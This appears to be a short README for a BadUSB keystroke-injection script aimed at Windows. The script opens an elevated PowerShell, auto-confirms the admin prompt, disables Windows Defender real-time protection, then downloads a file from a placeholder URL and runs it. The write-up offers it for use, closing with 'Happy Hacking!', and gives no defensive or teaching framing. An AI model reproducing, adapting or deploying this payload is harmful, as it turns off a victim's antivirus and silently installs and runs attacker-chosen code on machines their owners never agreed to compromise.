# badusb-download-execute-disable-windows-defender
This is a Bad USB script which will download and execute any file from the web which is accessible from a direct download link and it will also disable Windows Defender Real Time Protection.

Here is the BadUSB script:
```
DELAY 1000
GUI r
DELAY 200
STRING powershell Start-Process powershell -Verb runAs
ENTER
DELAY 1000
DELAY 1000
ALT y 
DELAY 200
STRING Set-MpPreference -DisableRealtimeMonitoring $true
ENTER
DELAY 1200
STRING $down = New-Object System.Net.WebClient; $url = 'URL_GOES_HERE'; $file = 'FILE_NAME_OUTPUT'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;
```

Make sure to change URL_GOES_HERE and FILE_NAME_OUTPUT on the script in order for this to work.
Happy Hacking!
